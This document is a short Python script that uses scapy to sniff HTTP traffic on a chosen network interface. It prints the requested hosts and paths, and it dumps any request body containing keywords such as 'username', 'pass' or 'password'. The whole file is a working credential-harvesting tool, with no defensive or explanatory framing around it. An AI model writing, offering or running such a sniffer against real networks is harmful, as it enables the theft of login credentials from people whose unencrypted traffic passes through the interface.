#!/ust/bin/env python
import os

import scapy.all as scapy
from scapy.layers import http
from scapy.layers.l2 import Ether
import optparse


parser = optparse.OptionParser()
parser.add_option("-i", "--iface", dest="interface", help="Target interface")
(options, arguments) = parser.parse_args()


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(str(packet.Host) + str(packet.Path) + "      " + str(packet.Referer))
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["uname", "username", "login", "email", "pass", "password", "key"]
            for word in keywords:
                if word in load:
                    print("[+] Possible username/password >>>")
                    print(load)
                    print(packet.Referer.decode('utf8'))
                    break


for i in os.listdir('/sys/class/net'):
    if str(options.interface) == i:
        sniff(str(options.interface))
        break
else:
    print("[-] Enter existing interface")
